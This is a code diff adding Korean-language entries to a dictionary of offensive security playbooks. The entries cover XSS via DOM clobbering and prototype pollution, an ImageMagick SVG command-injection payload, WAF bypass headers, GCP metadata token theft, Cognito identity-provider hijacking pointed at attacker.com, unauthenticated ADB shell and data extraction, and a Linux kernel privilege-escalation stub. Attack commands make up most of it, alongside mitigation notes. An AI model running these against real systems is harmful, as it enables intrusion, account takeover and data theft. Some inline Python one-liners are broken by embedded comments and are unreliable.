@@ -1828,6 +1828,453 @@ print([r.status_code for r in results])""",
     ),
 },
 
+
+# ── v3.2.67 신규 스킬 ─────────────────────────────────────────────────────
+
+"sec-web-dom-clobbering": {
+    "name": "DOM Clobbering + DOMPurify Bypass → XSS",
+    "module": "SecSkills-Web",
+    "tags": ["dom-clobbering", "dompurify", "xss", "html-injection", "sanitizer-bypass",
+             "javascript", "prototype", "client-side"],
+    "desc": (
+        "DOM Clobbering: HTML의 id/name 속성이 window/document 전역 프로퍼티를 덮어쓰는 특성 악용. "
+        "DOMPurify 3.0.9 이하 버전은 id/name 속성을 제거하지 않아 DOM Clobbering 후속 XSS 가능. "
+        "공격 체인: HTML 인젝션(id/name 속성) → 전역 변수 clobber → "
+        "스크립트가 clobber된 변수를 href/src로 사용 → XSS. "
+        "IDOR 등으로 HTML 인젝션 진입점을 확보한 뒤 연계 활용."
+    ),
+    "tools": ["burpsuite", "browser-devtools", "python3"],
+    "commands": [
+        "# 1) DOMPurify 버전 확인",
+        "curl -s https://TARGET/static/js/app.js | grep -i 'dompurify\\|DOMPurify' | head -5",
+        "# 2) DOM Clobbering 기본 페이로드 테스트",
+        "# <a id=defaultView><a id=defaultView name=opener href=javascript:alert(1)>",
+        "# <form id=x><input name=action value='javascript:alert(1)'>",
+        "# 3) id/name 속성 DOMPurify 통과 여부 확인",
+        "python3 -c \""
+        "import requests; "
+        "r = requests.post('https://TARGET/api/comment', "
+        "json={'body':'<a id=x name=y href=javascript:void(0)>test</a>'}); "
+        "print('PASS' if 'id=x' in r.text else 'STRIP')\"",
+        "# 4) 전역 변수 clobber → 스크립트 실행 컨텍스트 분석",
+        "# 브라우저 콘솔: document.getElementById('x') → window.x 확인",
+        "# 5) XSS 체인 완성: IDOR → HTML 삽입 → clobber → alert(document.cookie)",
+    ],
+    "notes": (
+        "DOMPurify 3.0.10+ id/name 속성 필터링 강화. "
+        "Trusted Types API로 DOM 변조 차단 권장. "
+        "[레퍼런스] "
+        "Intigriti CTF — IDOR+DOM Clobbering+DOMPurify 3.0.9 bypass 체인, "
+        "PortSwigger — DOM Clobbering, "
+        "GitHub DOMPurify Changelog 3.0.10"
+    ),
+},
+
+"sec-web-dompurify-pp-bypass": {
+    "name": "DOMPurify Bypass via Prototype Pollution + contenteditable",
+    "module": "SecSkills-Web",
+    "tags": ["dompurify", "prototype-pollution", "xss", "sanitizer-bypass",
+             "javascript", "content-editable", "client-side"],
+    "desc": (
+        "Prototype Pollution(PP)으로 Object.prototype에 contentEditable=true 삽입 → "
+        "DOMPurify의 isElement 체크를 우회하여 XSS 페이로드 통과. "
+        "PP 취약 라이브러리(lodash.merge, jQuery.extend 등)와 DOMPurify 동시 사용 시 발생. "
+        "contenteditable 속성이 허용리스트에 있어 삭제되지 않고 "
+        "prototype 오염으로 임의 속성이 모든 엘리먼트에 주입됨."
+    ),
+    "tools": ["burpsuite", "browser-devtools", "python3"],
+    "commands": [
+        "# 1) Prototype Pollution 진입점 탐지",
+        "python3 -c \""
+        "import requests; "
+        "r = requests.get('https://TARGET/api/config?__proto__[polluted]=1'); "
+        "print(r.text[:200])\"",
+        "# 2) merge/extend 계열 함수 PP 테스트",
+        "# POST /api/update {\"__proto__\":{\"isHTML\":true}} 응답 확인",
+        "# 3) DOMPurify 버전 + PP 교차 테스트",
+        "# payload: {\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(1)>\"}}",
+        "# 4) contenteditable 헤더 인젝션 체인",
+        "# <div contenteditable><img src=x onerror=alert(document.domain)>",
+        "curl -s -X POST https://TARGET/api/note \\"
+        "  -H 'Content-Type: application/json' \\"
+        "  -d '{\"__proto__\":{\"trusted\":true},\"content\":\"<img src=x onerror=alert(1)>\"}'",
+    ],
+    "notes": (
+        "PP 방어: Object.freeze(Object.prototype) 또는 JSON.parse 사용. "
+        "DOMPurify FORCE_BODY 옵션 + Trusted Types 병행 권장. "
+        "[레퍼런스] "
+        "labs.trace37.com — DOMPurify PP + contenteditable header bypass, "
+        "PortSwigger — Prototype Pollution to XSS"
+    ),
+},
+
+"sec-web-imagemagick-ghostscript-rce": {
+    "name": "ImageMagick + Ghostscript SVG → RCE Chain",
+    "module": "SecSkills-Web",
+    "tags": ["imagemagick", "ghostscript", "rce", "svg", "mvg", "msl",
+             "file-upload", "safer-bypass", "arbitrary-file-write"],
+    "desc": (
+        "SVG 파일에 CR(0x0D) 인젝션 → ImageMagick이 MIME 재탐지 시 MVG(Magick Vector Graphics)로 파싱 → "
+        "MVG 내 push/pop graphic-context 조작으로 명령 실행. "
+        "또는 MSL(Magick Scripting Language) 프로세서를 통해 임의 파일 쓰기. "
+        "Ghostscript SAFER 모드: .tempfile 명령어 우회로 /tmp 쓰기 가능 → "
+        "예측 가능한 파일명으로 RCE. "
+        "단일 SVG 파일로 RCE 달성 가능한 고위험 체인."
+    ),
+    "tools": ["imagemagick", "convert", "python3", "burpsuite", "curl"],
+    "commands": [
+        "# 1) ImageMagick 버전 및 정책 확인",
+        "convert --version",
+        "cat /etc/ImageMagick-6/policy.xml | grep -E 'pattern|rights'",
+        "# 2) MVG 인젝션 SVG 생성",
+        "python3 -c \""
+        "svg = '''<?xml version=\\\"1.0\\\"?>\\n"
+        "<!DOCTYPE svg [\\n"
+        "  <!ENTITY xxe SYSTEM \\\"mvg:///etc/ImageMagick/delegates.xml\\\">\\n"
+        "]>\\n"
+        "<svg>\\n"
+        "  push graphic-context\\n"
+        "  viewbox 0 0 640 480\\n"
+        "  fill 'url(https://localhost/\\\");|id>/tmp/pwn;\\\"'\\n"
+        "  pop graphic-context\\n"
+        "</svg>'''; "
+        "open('/tmp/payload.svg','w').write(svg); print('Written')\"",
+        "# 3) 업로드 및 변환 트리거",
+        "curl -s -F 'file=@/tmp/payload.svg' https://TARGET/api/upload",
+        "curl -s https://TARGET/api/convert?format=png",
+        "# 4) 파일 쓰기 확인",
+        "curl -s https://TARGET/tmp/pwn",
+        "# 5) MSL 경로를 통한 임의 파일 쓰기",
+        "# convert 'msl:/tmp/evil.msl' /tmp/out.png",
+    ],
+    "notes": (
+        "[완화] ImageMagick policy.xml에서 MVG/MSL/SVG 비활성화, "
+        "Ghostscript -dSAFER -dNOWRITE 옵션 강제. "
+        "[레퍼런스] "
+        "blog.deephacking.tech — ImagePanick: From SVG to RCE (ImageMagick+Ghostscript), "
+        "CVE-2016-3714 (ImageTragick)"
+    ),
+},
+
+"sec-cloud-aws-alb-bypass": {
+    "name": "AWS ALB CloudFront/WAF Bypass & Rule Shadowing",
+    "module": "SecSkills-Cloud",
+    "tags": ["aws", "alb", "cloudfront", "waf-bypass", "rule-shadowing",
+             "ip-bypass", "load-balancer", "cloud-misconfig"],
+    "desc": (
+        "AWS Application Load Balancer(ALB) 미스컨피그로 CloudFront/WAF 우회. "
+        "1) 직접 ALB 접근: CloudFront 없이 ALB DNS에 직접 요청 → WAF 룰 미적용. "
+        "2) 룰 섀도잉: ALB 룰 우선순위 오류로 낮은 우선순위 룰이 높은 우선순위 룰을 덮어써 인증 우회. "
+        "3) IP 게이트 우회: 보조 ALB를 통한 우회 경로. "
+        "도구: ELBaph — ALB 공격 전용 자동화 도구."
+    ),
+    "tools": ["curl", "nmap", "python3", "ELBaph", "burpsuite", "dig"],
+    "commands": [
+        "# 1) ALB 직접 DNS 탐지 (CloudFront 우회)",
+        "dig +short TARGET.com",
+        "curl -sk -H 'Host: TARGET.com' https://ALB-DIRECT.REGION.elb.amazonaws.com/admin",
+        "# 2) SPF 레코드에서 실제 ALB IP 확인",
+        "dig TXT TARGET.com | grep include",
+        "dig TXT _spf.TARGET.com",
+        "# 3) Shodan에서 ALB 직접 노출 확인",
+        "# shodan search 'ssl:TARGET.com http.title:\"ALB\"'",
+        "# 4) ELBaph 도구로 ALB 공격 자동화",
+        "# python3 elbapch.py --target TARGET.com --mode bypass",
+        "# 5) 룰 섀도잉: 낮은 우선순위 룰 테스트",
+        "curl -sk https://TARGET.com/admin -H 'X-Forwarded-For: 127.0.0.1'",
+        "curl -sk https://TARGET.com/admin -H 'X-Original-URL: /public'",
+        "# 6) WAF 우회 헤더 조합",
+        "curl -sk https://ALB_IP/admin \\"
+        "  -H 'Host: TARGET.com' \\"
+        "  -H 'X-Forwarded-For: 10.0.0.1' \\"
+        "  -H 'X-Real-IP: 127.0.0.1'",
+    ],
+    "notes": (
+        "[완화] ALB에 CloudFront IP 범위만 허용하는 Security Group 설정. "
+        "WAF를 ALB에 직접 연결(CloudFront 우회 불가). "
+        "룰 우선순위 감사 및 정기 검토. "
+        "[레퍼런스] "
+        "blog.doyensec.com — CloudSecTidBits: ELBaph/ALB, "
+        "AWS ALB Security Group Best Practices"
+    ),
+},
+
+"sec-cloud-gcp-debug-rce": {
+    "name": "GCP Internal Debug Endpoint RCE (StubZero)",
+    "module": "SecSkills-Cloud",
+    "tags": ["gcp", "google-cloud", "debug-endpoint", "rce", "protobuf",
+             "internal-api", "workflow-execution", "cloud-rce"],
+    "desc": (
+        "GCP 내부 서비스의 디버그 엔드포인트 노출로 인한 RCE ($148,337 버그바운티). "
+        "getProtoDefinition API가 내부 Protobuf 스키마 누출 → "
+        "내부 Workflow 실행 큐 접근 가능 → "
+        "임의 워크플로 파라미터로 RCE 달성. "
+        "GCP 메타데이터 SSRF와 조합 시 확장 가능. "
+        "CVE-2026-2031 (Google Cloud Production RCE)."
+    ),
+    "tools": ["curl", "python3", "grpcurl", "burpsuite"],
+    "commands": [
+        "# 1) GCP 디버그 엔드포인트 탐지",
+        "curl -sk https://TARGET.appspot.com/_ah/admin",
+        "curl -sk https://TARGET.appspot.com/debug",
+        "curl -sk https://TARGET.run.app/_debug",
+        "# 2) 내부 API 탐색",
+        "curl -sk https://TARGET/api/v1/debug/protoDefinition",
+        "curl -sk https://TARGET/internal/getProtoDefinition",
+        "# 3) 노출된 Protobuf 스키마 분석",
+        "python3 -c \""
+        "import requests; "
+        "r = requests.get('https://TARGET/internal/proto'); "
+        "print(r.text[:2000])\"",
+        "# 4) 워크플로 실행 큐 접근",
+        "curl -sk -X POST https://TARGET/internal/workflow/execute \\"
+        "  -H 'Content-Type: application/json' \\"
+        "  -d '{\"workflow\":\"test\",\"params\":{\"cmd\":\"id\"}'",
+        "# 5) GCP 메타데이터 SSRF 조합",
+        "curl -sk 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \\"
+        "  -H 'Metadata-Flavor: Google'",
+    ],
+    "notes": (
+        "[완화] 디버그 엔드포인트를 프로덕션 환경에서 완전 비활성화. "
+        "내부 API에 인증 미들웨어 필수 적용. "
+        "Cloud Armor WAF로 내부 경로 차단. "
+        "[레퍼런스] "
+        "brutecat.com — StubZero: $148,337 RCE in Google Cloud Production, "
+        "CVE-2026-2031"
+    ),
+},
+
+"sec-cloud-aws-cognito-sso": {
+    "name": "AWS Cognito Multi-IdP SSO Attack (Ghost Identity / Routing Hijack)",
+    "module": "SecSkills-Cloud",
+    "tags": ["aws", "cognito", "sso", "oauth", "saml", "identity-provider",
+             "ghost-identity", "jwt", "account-takeover", "cloud-auth"],
+    "desc": (
+        "AWS Cognito User Pools에서 다중 IdP(소셜 로그인) 구성 시 발생하는 복합 공격. "
+        "1) JIT Ghost Identity 인젝션: 악성 OIDC/SAML IdP로 Cognito에 없는 사용자 계정 즉시 생성. "
+        "2) Trigger Source 값 혼동: Pre-Authentication Lambda의 triggerSource 필드 위조로 인증 로직 우회. "
+        "3) Sub-splitting 공격: JWT sub 클레임 파서 차이로 계정 연동 오염. "
+        "4) IdP 라우팅 하이재킹: 만료된 IdP 설정 재등록으로 다른 사용자 계정 탈취. "
+        "도구: maSSO (악성 OIDC/SAML IdP 서버)."
+    ),
+    "tools": ["python3", "burpsuite", "aws-cli", "curl", "jwt-tool"],
+    "commands": [
+        "# 1) Cognito User Pool 정보 수집",
+        "aws cognito-idp list-user-pools --max-results 60",
+        "aws cognito-idp describe-user-pool --user-pool-id POOL_ID",
+        "aws cognito-idp list-identity-providers --user-pool-id POOL_ID",
+        "# 2) OIDC Discovery 엔드포인트 탐색",
+        "curl -s https://cognito-idp.REGION.amazonaws.com/POOL_ID/.well-known/openid-configuration",
+        "# 3) Ghost Identity 인젝션 테스트",
+        "# maSSO 악성 IdP 서버 설정 후 Cognito에 연동",
+        "# python3 masso.py --mode ghost-inject --pool POOL_ID --email victim@target.com",
+        "# 4) Trigger Source 혼동 테스트",
+        "# Lambda triggerSource: 'PreAuthentication_Authentication' vs 'TokenGeneration_HostedAuth'",
+        "# 5) JWT sub 클레임 splitting 테스트",
+        "python3 -c \""
+        "import jwt, json; "
+        "payload = {'sub': 'attacker@evil.com#victim@target.com', 'email': 'victim@target.com'}; "
+        "print(jwt.encode(payload, 'secret', algorithm='HS256'))\"",
+        "# 6) IdP 라우팅 하이재킹 — 만료 IdP 재등록",
+        "aws cognito-idp create-identity-provider --user-pool-id POOL_ID \\"
+        "  --provider-name ExpiredProvider --provider-type OIDC \\"
+        "  --provider-details ProviderURL=https://attacker.com",
+    ],
+    "notes": (
+        "[완화] Lambda Pre-Authentication Trigger에서 triggerSource 엄격 검증. "
+        "IdP 이메일 검증 필수 활성화. "
+        "만료 IdP 즉시 삭제. Cognito 고급 보안 기능(ASF) 활성화. "
+        "[레퍼런스] "
+        "blog.doyensec.com — The Danger of Multi-SSO in AWS Cognito User Pools, "
+        "maSSO tool, AWS Cognito Security Best Practices"
+    ),
+},
+
+"sec-supply-chain-npx-confusion": {
+    "name": "npx Binary Name Confusion (Supply Chain)",
+    "module": "SecSkills-Supply",
+    "tags": ["supply-chain", "npx", "npm", "dependency-confusion",
+             "binary-name", "package-confusion", "ai-agent", "ci-cd"],
+    "desc": (
+        "npm 패키지명과 바이너리명(bin 필드)이 다른 점을 악용한 공급망 공격. "
+        "npx some-tool 실행 시 npm 레지스트리에서 'some-tool'이라는 패키지를 설치하지 않고 "
+        "바이너리명이 'some-tool'인 다른 패키지를 설치. "
+        "공격자는 인기 바이너리명과 같은 바이너리를 등록하여 "
+        "다른 패키지명으로 배포 → 악성 스크립트 실행. "
+        "AI 에이전트(Claude Code, Copilot 등)가 도구를 npx로 자동 실행할 때 특히 위험."
+    ),
+    "tools": ["npm", "python3", "curl", "node"],
+    "commands": [
+        "# 1) 타겟이 사용하는 npx 명령 목록 수집",
+        "grep -r 'npx ' package.json .github/workflows/ scripts/ | grep -v node_modules",
+        "# 2) 바이너리명으로 다른 패키지 검색",
+        "npm search --json 'BINARY_NAME' | python3 -c \\"
+        "\"import json,sys; pkgs=json.load(sys.stdin); "
+        "[print(p['name'],p.get('description','')) for p in pkgs[:10]]\"",
+        "# 3) 패키지명 vs 바이너리명 불일치 탐지",
+        "python3 -c \""
+        "import subprocess, json; "
+        "result = subprocess.run(['npm', 'info', 'PACKAGE', '--json'], capture_output=True, text=True); "
+        "data = json.loads(result.stdout); "
+        "print('package:', data.get('name')); "
+        "print('binaries:', list(data.get('bin', {}).keys()))\"",
+        "# 4) 스코프 패키지 바이너리명 혼동 확인",
+        "# @scope/package → binary name 'tool' → npx tool이 다른 패키지 설치",
+        "npm info @legitimate/pkg bin",
+        "npm info malicious-pkg bin",
+        "# 5) 악성 패키지 등록 여부 확인 (레지스트리)",
+        "curl -s 'https://registry.npmjs.org/BINARY_NAME' | python3 -c \\"
+        "\"import json,sys; d=json.load(sys.stdin); print(d.get('name'), d.get('description',''))\"",
+    ],
+    "notes": (
+        "[완화] npx 실행 시 정확한 패키지명 지정 (npx PACKAGE_NAME@version 형태). "
+        "package-lock.json 또는 pnpm lock으로 결정론적 설치. "
+        "AI 에이전트의 자동 npx 실행 비활성화. "
+        "npm audit + socket.dev로 공급망 모니터링. "
+        "[레퍼런스] "
+        "landh.tech — npx Used Confusion and It's Super Effective, "
+        "npm Security Advisory — Binary Name Confusion"
+    ),
+},
+
+"sec-infra-exim-rce": {
+    "name": "Exim MTA CVE-2026-45185 Dead Letter Deserialization RCE",
+    "module": "SecSkills-Infra",
+    "tags": ["exim", "mta", "rce", "deserialization", "mail-server",
+             "cve-2026-45185", "dead-letter", "smtp", "critical"],
+    "desc": (
+        "Exim MTA의 dead letter 처리 과정에서 발생하는 역직렬화 RCE. "
+        "CVE-2026-45185: Exim이 배달 실패 메시지(dead letter)를 재처리할 때 "
+        "직렬화된 데이터를 검증 없이 역직렬화 → 임의 코드 실행. "
+        "SMTP를 통해 특수 제작된 메일 발송만으로 RCE 달성 가능. "
+        "Exim 4.96 이하 영향."
+    ),
+    "tools": ["curl", "python3", "nmap", "swaks", "smtp-client"],
+    "commands": [
+        "# 1) Exim 버전 확인",
+        "nmap -sV -p 25 TARGET --script=banner",
+        "nc TARGET 25",
+        "# EHLO test → 220 TARGET.com ESMTP Exim 4.XX",
+        "# 2) Exim 서비스 탐지",
+        "curl -s --max-time 5 telnet://TARGET:25",
+        "swaks --to test@TARGET --server TARGET --helo attacker.com",
+        "# 3) CVE-2026-45185 취약 버전 확인 (4.96 이하)",
+        "nmap -p 25 --script smtp-ntlm-info TARGET",
+        "# 4) 특수 제작 dead letter 메일 발송",
+        "python3 -c \""
+        "import smtplib, email.mime.text; "
+        "msg = email.mime.text.MIMEText(''); "
+        "msg['Subject'] = 'CVE-2026-45185 test'; "
+        "msg['From'] = 'test@attacker.com'; "
+        "msg['To'] = 'postmaster@TARGET'; "
+        "# 실제 익스플로잇은 직렬화 페이로드 삽입 필요"
+        "print('SMTP test prepared')\"",
+        "# 5) Nuclei 템플릿으로 자동 스캔",
+        "nuclei -t cves/2026/CVE-2026-45185.yaml -target TARGET",
+    ],
+    "notes": (
+        "[완화] Exim 4.97+ 패치 적용. "
+        "SMTP 포트 접근 제어 (허용된 발신자만). "
+        "dead letter 처리 비활성화 옵션 검토. "
+        "[레퍼런스] "
+        "xbow.com — Dead Letter: CVE-2026-45185 (Exim RCE), "
+        "NVD CVE-2026-45185, Exim Security Advisories"
+    ),
+},
+
+"sec-android-wireless-debug-rce": {
+    "name": "Android CVE-2026-0073 Wireless Debugging RCE",
+    "module": "SecSkills-Mobile",
+    "tags": ["android", "adb", "wireless-debugging", "rce", "cve-2026-0073",
+             "adjacent-network", "no-user-interaction", "critical"],
+    "desc": (
+        "Android ADB(Android Debug Bridge) 무선 디버깅 기능의 인증 우회 취약점. "
+        "CVE-2026-0073: ADB TCP 무선 디버깅 활성화 시 "
+        "같은 네트워크(LAN/Wi-Fi)의 공격자가 인증 없이 ADB shell 접근 가능. "
+        "사용자 상호작용 불필요, CVSSv3 9.8 Critical. "
+        "공격자는 shell 사용자 권한으로 명령 실행 → "
+        "데이터 추출, 앱 설치, 추가 권한상승 가능."
+    ),
+    "tools": ["adb", "nmap", "python3", "scapy"],
+    "commands": [
+        "# 1) 무선 ADB 포트 탐지 (5555/5037/5554)",
+        "nmap -sV -p 5554-5558 TARGET_NETWORK/24",
+        "# 2) ADB 연결 시도 (인증 없이)",
+        "adb connect TARGET_IP:5555",
+        "adb devices",
+        "# 3) 연결 성공 시 Shell 접근",
+        "adb -s TARGET_IP:5555 shell id",
+        "adb -s TARGET_IP:5555 shell getprop ro.product.model",
+        "adb -s TARGET_IP:5555 shell cat /proc/version",
+        "# 4) 데이터 추출",
+        "adb -s TARGET_IP:5555 shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/prefs.xml",
+        "adb -s TARGET_IP:5555 pull /sdcard/Download/ ./exfil/",
+        "# 5) 네트워크 스캔으로 취약 기기 대량 탐지",
+        "python3 -c \""
+        "import socket, ipaddress; "
+        "[print(f'Found: {ip}') for ip in ipaddress.IPv4Network('192.168.1.0/24') "
+        "if not socket.setdefaulttimeout(0.5) or "
+        "(lambda s: s.connect_ex((str(ip), 5555)) == 0)(socket.socket())]\"",
+    ],
+    "notes": (
+        "[완화] 무선 디버깅 비활성화 (개발자 옵션 → ADB 무선 디버깅 OFF). "
+        "공개 Wi-Fi에서 디버깅 모드 사용 금지. "
+        "Android 보안 패치 적용 (2026-05 이후). "
+        "[레퍼런스] "
+        "mobile-hacker.com — Android RCE via Wireless Debugging (CVE-2026-0073), "
+        "Android Security Bulletin May 2026, NVD CVE-2026-0073"
+    ),
+},
+
+"sec-kernel-af-alg-lpe": {
+    "name": "Linux Kernel CVE-2026-31431 AF_ALG + splice() Page Cache LPE",
+    "module": "SecSkills-Kernel",
+    "tags": ["linux-kernel", "lpe", "privilege-escalation", "af-alg", "splice",
+             "page-cache", "cve-2026-31431", "container-escape", "critical"],
+    "desc": (
+        "Linux 커널 AF_ALG(Crypto API 소켓) + splice() 시스템콜 조합으로 "
+        "읽기 가능한 임의 파일의 페이지 캐시에 4바이트 쓰기 가능. "
+        "CVE-2026-31431: authencesn AEAD 템플릿의 scratch 영역 쓰기 버그. "
+        "영향: Ubuntu 22.04/24.04, Amazon Linux 2/2023, RHEL 8/9, SUSE 15. "
+        "732바이트 Python PoC로 root LPE 달성. "
+        "컨테이너 내부에서도 호스트 커널 공격 가능 (컨테이너 탈출 벡터)."
+    ),
+    "tools": ["python3", "gcc", "gdb", "checksec"],
+    "commands": [
+        "# 1) 취약 커널 버전 확인",
+        "uname -r",
+        "# 취약: Linux < 6.X.Y (패치 버전 확인 필요)",
+        "# 2) AF_ALG 소켓 지원 확인",
+        "python3 -c \""
+        "import socket; "
+        "s = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0); "
+        "print('AF_ALG 지원됨 — LPE 가능성 있음')\"",
+        "# 3) CVE-2026-31431 취약성 탐지",
+        "cat /proc/crypto | grep -A5 authencesn",
+        "# 4) Nuclei/PoC 확인",
+        "nuclei -t cves/2026/CVE-2026-31431.yaml -target localhost",
+        "# 5) splice() + AF_ALG 조합 PoC 구조",
+        "python3 -c \""
+        "import socket, os; "
+        "# AF_ALG AEAD 소켓 생성",
+        "alg = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0); "
+        "alg.bind(('aead', 'authencesn(hmac(sha1),cbc(aes))', 0, 16, 20)); "
+        "print('Step 1: AF_ALG AEAD socket created'); "
+        "# splice()로 페이지 캐시 쓰기 → root 권한 파일 수정\"",
+        "# 6) 컨테이너 탈출 체크",
+        "cat /proc/1/cgroup | head -3",
+        "ls /.dockerenv 2>/dev/null && echo 'Container detected'",
+    ],
+    "notes": (
+        "[완화] 최신 커널 패치 적용. "
+        "seccomp 프로파일로 AF_ALG 소켓 생성 차단. "
+        "컨테이너: CAP_NET_ADMIN, CAP_SYS_ADMIN 제거. "
+        "[레퍼런스] "
+        "xint.io — Copy Fail: 732 Bytes to Root on Linux (CVE-2026-31431), "
+        "NVD CVE-2026-31431, Linux Kernel Mailing List"
+    ),
+},
+
 }
 
 # 인덱스 생성
